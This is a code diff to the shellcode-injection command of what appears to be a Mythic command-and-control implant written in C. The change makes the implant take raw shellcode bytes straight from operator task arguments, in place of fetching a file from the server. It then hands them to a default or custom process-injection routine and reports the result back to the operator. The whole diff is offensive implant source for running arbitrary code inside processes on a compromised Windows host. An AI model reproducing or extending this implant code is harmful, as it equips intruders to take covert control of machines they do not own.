@@ -21,78 +21,86 @@
  */
 VOID InjectShellcode(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
 {
-    DWORD  Status;
-    BOOL   isProcessInjectKit   = FALSE;
-    MYTHIC_FILE Shellcode       = { 0 };
-    PCHAR  injectKitBof         = NULL;
-    SIZE_T uuidLen              = 0;
-    SIZE_T kitLen               = 0;
-    PCHAR  Output               = NULL;
+    BOOL   isProcessInjectKit    = FALSE;
+    PBYTE  Shellcode              = NULL;
+    PCHAR  injectKitBof           = NULL;
+    SIZE_T scLength               = 0;
+    SIZE_T kitLen                 = 0;
+    PCHAR  Output                 = NULL;
+    SIZE_T OutLen                 = 0;
 
     /* Parse command arguments */
     UINT32 nbArg = ParserGetInt32(arguments);
     _dbg("GOT %d arguments", nbArg);
 
-    if (nbArg > 1) {
+    if ( nbArg > 1 )
+    {
         isProcessInjectKit = TRUE;
     }
+    
+    
+    /* Get shellcode bytes */
+    PCHAR shellcodeData = ParserGetString(arguments, &scLength);
 
-    PCHAR  fileUuid  = ParserGetString(arguments, &uuidLen);
-    if (isProcessInjectKit) {
+    if ( shellcodeData == NULL || scLength <= 8 ) 
+    {
+        _err("Failed to parse shellcode bytes from arguments.");
+        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
+        return;
+    }
+    Shellcode = (PBYTE)(shellcodeData + 8);  // Skip 8 bytes (typed array header)
+    scLength  -= 8;
+
+    _dbg("Received shellcode - %d bytes", scLength);
+
+    /* Parse process injection kit if enabled */
+    if ( isProcessInjectKit ) 
+    {
         injectKitBof = ParserGetString(arguments, &kitLen);
-        injectKitBof += 8;                                                  // bc of the way translation container is packing it
+        injectKitBof += 8;  // Skip 8 bytes (typed array header)
         kitLen       -= 8;
         _dbg("[+] Using Custom Process Injection Kit. %d bytes", kitLen);
     }
 
-    strncpy(Shellcode.fileUuid, fileUuid, TASK_UUID_SIZE + 1);
-    Shellcode.fileUuid[TASK_UUID_SIZE + 1] = '\0';
-
-    _dbg("Fetching Mythic file - %s", Shellcode.fileUuid);
-
-    /* Fetch file from Mythic using File UUID */
-    if (Status = MythicGetFileBytes(taskUuid, &Shellcode) != 0)
+    /* Inject shellcode ( default | custom kit ) */
+    if ( isProcessInjectKit ) 
     {
-        _err("Failed to fetch file from Mythic server.");
-        PackageError(taskUuid, Status);
-        return;
-    }
-
-    /* Inject shellcode ( default | custom kit )*/
-    if (isProcessInjectKit) {
-        if (!InjectCustomKit((PBYTE)Shellcode.buffer, Shellcode.size, injectKitBof, kitLen, &Output)) {
+        if ( !InjectCustomKit(Shellcode, scLength, injectKitBof, kitLen, &Output, &OutLen) ) 
+        {
             DWORD error = GetLastError();
             _err("[!] Failed to inject with kit. ERROR : %d\n", error);
             PackageError(taskUuid, error);
-            return FALSE;
+            return;
         }
-    } else {
-        if (!InjectDefault((PBYTE)Shellcode.buffer, Shellcode.size, &Output)) {
+    } 
+    else 
+    {
+        if ( !InjectDefault(Shellcode, scLength, &Output, &OutLen) ) 
+        {
             DWORD error = GetLastError();
             _err("[!] Failed to inject with default method. ERROR : %d\n", error);
             PackageError(taskUuid, error);
-            return FALSE;
+            return;
         }
     }
 
     _dbg("[+] Done injecting.");
 
     // Output
-    PPackage data = PackageInit(0, FALSE);
-
-    if (Output != NULL) {
+    PPackage data = NULL;
+    if ( Output != NULL && OutLen != 0 )
+    {
+        data = PackageInit(0, FALSE);
         PackageAddString(data, Output, FALSE);
     }
 
     // Success
     PackageComplete(taskUuid, data);
-
+    
 END:
     // Cleanup
-    free(Output);
-    LocalFree(Shellcode.buffer);                // Allocated in MythicGetFileBytes()
-    Shellcode.buffer = NULL;
-    if (data) PackageDestroy(data);
+    PackageDestroy(data);
+    if (Output) free(Output);
 }
 
 #endif // INCLUDE_CMD_INJECT_SHELLCODE
